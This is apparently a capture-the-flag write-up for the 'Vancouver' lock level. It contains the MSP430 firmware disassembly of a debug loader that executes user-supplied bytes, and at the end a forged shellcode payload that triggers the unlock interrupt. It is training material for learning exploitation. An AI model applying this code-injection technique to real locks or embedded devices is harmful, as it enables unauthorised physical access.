Vancouver
--------------------------------
OVERVIEW

    - Lockitall is under new management.
    - This new series of locks provide a debug interface for in-field
      debugging.


DETAILS

    The LockIT 2 A.01  is the first  of a new series  of locks.  It is
    controlled by a  MSP430 microcontroller. The MSP430 is a very low-
    power device, chosen because we found several crates of old stock.

    This lock only accepts biometric and NFC inputs, and does not have
    a traditional password prompt.

    To support  debugging  in the  field, this  lock accepts a program
    from the old password input prompt. The input prompt is no  longer
    available from outside the lock.

    An example in-field debug payload follows,  but please contact our
    support technicians for additional paylods.

    8000023041

    This is Hardware Version Alpha.

    This is Software Revision 01.
--------------------------------
0010 <__trap_interrupt>
0010:  3041           ret
4400 <__watchdog_support>
4400:  5542 5c01      mov.b	&0x015c, r5
4404:  35d0 085a      bis	#0x5a08, r5
4408:  8245 0028      mov	r5, &0x2800
440c <__init_stack>
440c:  3140 0044      mov	#0x4400, sp
4410 <__do_copy_data>
4410:  3f40 0000      clr	r15
4414:  0f93           tst	r15
4416:  0824           jz	$+0x12 <__do_clear_bss+0x0>
4418:  9242 0028 5c01 mov	&0x2800, &0x015c
441e:  2f83           decd	r15
4420:  9f4f ea45 0024 mov	0x45ea(r15), 0x2400(r15)
4426:  f823           jnz	$-0xe <__do_copy_data+0x8>
4428 <__do_clear_bss>
4428:  3f40 0004      mov	#0x400, r15
442c:  0f93           tst	r15
442e:  0724           jz	$+0x10 <main+0x0>
4430:  9242 0028 5c01 mov	&0x2800, &0x015c
4436:  1f83           dec	r15
4438:  cf43 0024      mov.b	#0x0, 0x2400(r15)
443c:  f923           jnz	$-0xc <__do_clear_bss+0x8>
443e <main>
443e:  3f40 7a45      mov	#0x457a "Welcome to the test program loader.", r15
4442:  b012 de44      call	#0x44de <puts>
4446:  3f40 9e45      mov	#0x459e "Please enter debug payload.", r15
444a:  b012 de44      call	#0x44de <puts>
444e:  3d40 0004      mov	#0x400, r13
4452:  0e43           clr	r14
4454:  3f40 0024      mov	#0x2400, r15
4458:  b012 0e45      call	#0x450e <memset>
445c:  3e40 ff03      mov	#0x3ff, r14
4460:  3f40 0024      mov	#0x2400, r15
4464:  b012 c044      call	#0x44c0 <getsn>
4468:  5b42 0024      mov.b	&0x2400, r11
446c:  8b10           swpb	r11
446e:  5f42 0124      mov.b	&0x2401, r15
4472:  0bdf           bis	r15, r11
4474:  5a42 0224      mov.b	&0x2402, r10
4478:  2a93           cmp	#0x2, r10
447a:  052c           jc	$+0xc <main+0x48>
447c:  3f40 ba45      mov	#0x45ba "Invalid payload length", r15
4480:  b012 de44      call	#0x44de <puts>
4484:  e03f           jmp	$-0x3e <main+0x8>
4486:  3f40 d145      mov	#0x45d1 "Executing debug payload", r15
448a:  b012 de44      call	#0x44de <puts>
448e:  0d4a           mov	r10, r13
4490:  3e40 0324      mov	#0x2403, r14
4494:  0f4b           mov	r11, r15
4496:  b012 fc44      call	#0x44fc <memcpy>
449a:  8b12           call	r11
449c:  d43f           jmp	$-0x56 <main+0x8>
449e <__stop_progExec__>
449e:  32d0 f000      bis	#0xf0, sr
44a2:  fd3f           jmp	$-0x4 <__stop_progExec__+0x0>
44a4 <__ctors_end>
44a4:  3040 7845      br	#0x4578 <_unexpected_>
44a8 <INT>
44a8:  1f41 0200      mov	0x2(sp), r15
44ac:  0212           push	sr
44ae:  4f4f           mov.b	r15, r15
44b0:  8f10           swpb	r15
44b2:  3fd0 0080      bis	#0x8000, r15
44b6:  024f           mov	r15, sr
44b8:  b012 1000      call	#0x10
44bc:  3241           pop	sr
44be:  3041           ret
44c0 <getsn>
44c0:  0e12           push	r14
44c2:  0f12           push	r15
44c4:  2312           push	#0x2
44c6:  b012 a844      call	#0x44a8 <INT>
44ca:  3150 0600      add	#0x6, sp
44ce:  3041           ret
44d0 <putchar>
44d0:  8f11           sxt	r15
44d2:  0f12           push	r15
44d4:  0312           push	#0x0
44d6:  b012 a844      call	#0x44a8 <INT>
44da:  2152           add	#0x4, sp
44dc:  3041           ret
44de <puts>
44de:  0b12           push	r11
44e0:  0b4f           mov	r15, r11
44e2:  033c           jmp	$+0x8 <puts+0xc>
44e4:  1b53           inc	r11
44e6:  b012 d044      call	#0x44d0 <putchar>
44ea:  6f4b           mov.b	@r11, r15
44ec:  4f93           tst.b	r15
44ee:  fa23           jnz	$-0xa <puts+0x6>
44f0:  7f40 0a00      mov.b	#0xa, r15
44f4:  b012 d044      call	#0x44d0 <putchar>
44f8:  3b41           pop	r11
44fa:  3041           ret
44fc <memcpy>
44fc:  0c4f           mov	r15, r12
44fe:  043c           jmp	$+0xa <memcpy+0xc>
4500:  fc4e 0000      mov.b	@r14+, 0x0(r12)
4504:  1c53           inc	r12
4506:  3d53           add	#-0x1, r13
4508:  0d93           tst	r13
450a:  fa23           jnz	$-0xa <memcpy+0x4>
450c:  3041           ret
450e <memset>
450e:  0b12           push	r11
4510:  0a12           push	r10
4512:  0912           push	r9
4514:  0812           push	r8
4516:  3d90 0600      cmp	#0x6, r13
451a:  092c           jc	$+0x14 <memset+0x20>
451c:  0c4f           mov	r15, r12
451e:  043c           jmp	$+0xa <memset+0x1a>
4520:  cc4e 0000      mov.b	r14, 0x0(r12)
4524:  1c53           inc	r12
4526:  3d53           add	#-0x1, r13
4528:  0d93           tst	r13
452a:  fa23           jnz	$-0xa <memset+0x12>
452c:  203c           jmp	$+0x42 <memset+0x60>
452e:  4e4e           mov.b	r14, r14
4530:  4b4e           mov.b	r14, r11
4532:  0b93           tst	r11
4534:  0324           jz	$+0x8 <memset+0x2e>
4536:  0c4b           mov	r11, r12
4538:  8c10           swpb	r12
453a:  0bdc           bis	r12, r11
453c:  1fb3           bit	#0x1, r15
453e:  0624           jz	$+0xe <memset+0x3e>
4540:  3d53           add	#-0x1, r13
4542:  cf4e 0000      mov.b	r14, 0x0(r15)
4546:  094f           mov	r15, r9
4548:  1953           inc	r9
454a:  013c           jmp	$+0x4 <memset+0x40>
454c:  094f           mov	r15, r9
454e:  0c4d           mov	r13, r12
4550:  12c3           clrc
4552:  0c10           rrc	r12
4554:  0a49           mov	r9, r10
4556:  084c           mov	r12, r8
4558:  8a4b 0000      mov	r11, 0x0(r10)
455c:  2a53           incd	r10
455e:  3853           add	#-0x1, r8
4560:  fb23           jnz	$-0x8 <memset+0x4a>
4562:  0c5c           add	r12, r12
4564:  0c59           add	r9, r12
4566:  1df3           and	#0x1, r13
4568:  0224           jz	$+0x6 <memset+0x60>
456a:  cc4e 0000      mov.b	r14, 0x0(r12)
456e:  3841           pop	r8
4570:  3941           pop	r9
4572:  3a41           pop	r10
4574:  3b41           pop	r11
4576:  3041           ret
4578 <_unexpected_>
4578:  0013           reti	pc
457a <__data_start+0x217a>
457a .strings:
457a: "Welcome to the test program loader."
459e: "Please enter debug payload."
45ba: "Invalid payload length"
45d1: "Executing debug payload"
--------------------------------
Example payload: 
  8000023041
Looking at the code its obvious that the bytes after 8000 02 get executed
its 3041 int the exaple payload (ret)

Lets try an interrupt thats supposed to open the lock.
  <unlock_door>
    3012 7f00      push	#0x7f
    b012 f444      call	#0x44f4 <INT>

Forged payload:
00000830127f00b012a844

Explanation:
0000      #Can be anything with a 2byte length
08        #8 bytes length 
3012 7f00 #push 0x7f, An interrupt with argument 0x7f opens the lock
b012 a844 #call 0x44a8
